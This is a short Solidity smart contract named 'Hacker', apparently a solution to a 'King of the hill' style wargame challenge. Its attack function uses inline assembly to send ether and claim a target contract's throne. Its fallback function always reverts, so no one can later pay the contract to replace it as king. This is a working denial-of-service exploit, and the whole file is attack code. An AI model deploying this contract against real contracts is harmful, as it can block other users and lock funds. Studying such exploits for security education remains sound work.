// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public payable onlyHacker {
    // Claim on the throne
    assembly {
      pop(
        // discard result
        call(
          1000000, // gas
          _target, // target address
          callvalue(), // wei sent together with the current call
          0, // input location
          0, // no input params
          0, // output location
          0 // no need to use output params
        )
      )
    }
  }

  fallback() external payable {
    // Refuse to receive any ether, the transactions made by new kings will fail.
    revert();
  }
}
